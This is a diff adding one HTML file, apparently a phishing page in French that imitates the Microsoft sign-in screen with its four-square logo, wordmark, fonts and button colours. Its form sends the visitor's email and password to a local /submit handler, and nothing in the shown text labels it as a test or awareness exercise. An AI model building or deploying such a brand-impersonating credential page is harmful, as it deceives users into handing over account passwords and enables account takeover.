@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Se connecter à votre compte</title>
+<style>
+  body { margin: 0; font-family: "Segoe UI", "Segoe UI Web", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+         background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080"><rect fill="%230078d4" width="1920" height="1080"/></svg>');
+         background-size: cover; background-position: center; min-height: 100vh;
+         display: flex; align-items: center; justify-content: center; padding: 16px; }
+  .card { background: white; max-width: 440px; width: 100%; padding: 44px;
+          box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+  .logo { width: 108px; height: 24px; margin-bottom: 16px; display: flex; align-items: center; }
+  .logo-square { display: inline-block; vertical-align: middle; }
+  .logo-square span { display: inline-block; width: 10px; height: 10px; }
+  .logo-text { margin-left: 8px; font-size: 15px; font-weight: 600; color: #5e5e5e; vertical-align: middle; }
+  h1 { font-size: 24px; font-weight: 600; margin: 16px 0 12px; color: #1b1b1b; }
+  .subtitle { font-size: 14px; color: #1b1b1b; margin-bottom: 16px; }
+  input { width: 100%; padding: 6px 10px; border: none; border-bottom: 1px solid #666;
+          font-size: 15px; box-sizing: border-box; margin-bottom: 20px;
+          background: transparent; }
+  input:focus { outline: none; border-bottom-color: #0067b8; border-bottom-width: 2px; padding-bottom: 5px; }
+  .options { font-size: 13px; margin-bottom: 22px; }
+  .options a { color: #0067b8; text-decoration: none; display: block; margin: 6px 0; }
+  .buttons { text-align: right; }
+  button { background: #0067b8; color: white; border: none; padding: 8px 24px;
+           font-size: 15px; cursor: pointer; min-width: 108px; }
+  .secondary { background: white; color: #1b1b1b; border: 1px solid #8a8886; margin-right: 8px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <div class="logo-square">
+      <span style="background:#f25022"></span><span style="background:#7fba00"></span><br>
+      <span style="background:#00a4ef"></span><span style="background:#ffb900"></span>
+    </div>
+    <span class="logo-text">Microsoft</span>
+  </div>
+  <h1>Se connecter</h1>
+  <form method="POST" action="/submit">
+    <input type="email" name="email" placeholder="E-mail, téléphone ou Skype" required>
+    <input type="password" name="password" placeholder="Mot de passe" required style="display:none" id="pwd">
+    <div class="options">
+      <a href="#" onclick="document.getElementById('pwd').style.display='block';return false;">Saisir un mot de passe</a>
+      <a href="#">Pas de compte ? Créez-en un !</a>
+      <a href="#">Vous n'arrivez pas à accéder à votre compte ?</a>
+    </div>
+    <div class="buttons">
+      <button type="button" class="secondary">Retour</button>
+      <button type="submit">Suivant</button>
+    </div>
+  </form>
+</div>
+</body>
+</html>
